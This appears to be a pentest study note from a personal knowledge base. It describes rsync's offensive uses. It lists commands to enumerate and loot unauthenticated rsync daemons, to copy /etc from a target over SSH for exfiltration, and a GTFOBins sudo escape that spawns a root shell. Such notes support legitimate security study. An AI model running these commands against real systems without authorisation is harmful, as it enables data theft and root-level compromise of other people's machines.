# rsync

**Tags:** `#rsync` `#filetransfer` `#exfil` `#privesc` `#gtfobins`

Fast delta-transfer file sync tool. Two modes matter offensively: talking to a remote **rsync daemon** on TCP 873 (often unauthenticated — enumerate/download/upload modules), and running over **SSH** for stealthy bulk exfil. It's also a **GTFOBins privesc** binary — if you can run it via `sudo`, it spawns a root shell. Pre-installed on Kali and most Linux hosts.

**Source:** https://rsync.samba.org · **Install:** pre-installed (`rsync`)

```bash
# Enumerate + pull an unauthenticated daemon module
rsync rsync://<target>/                       # list modules
rsync -av --list-only rsync://<target>/<mod>/ # list contents
rsync -av rsync://<target>/<mod>/ ./loot/     # download

# Bulk exfil over SSH (delta transfer, resumable)
rsync -avz -e "ssh -i key" user@<target>:/etc ./etc-copy/

# GTFOBins sudo privesc → root shell
sudo rsync -e 'sh -c "sh 0<&2 1>&2"' 127.0.0.1:/dev/null
```

> [!note] **See also** — [[Services/File Xfer/Rsync|Rsync]] service note (daemon enumeration, anon read/write → SSH-key/webshell, module→path abuse); local-privesc context in [[Class notes/HTB Academy/CPTS v2 (claude)/Linux Priv Esc|Linux Priv Esc]].

---

*Created: 2026-09-23*
*Updated: 2026-09-23*
*Model: claude-opus-4-8*
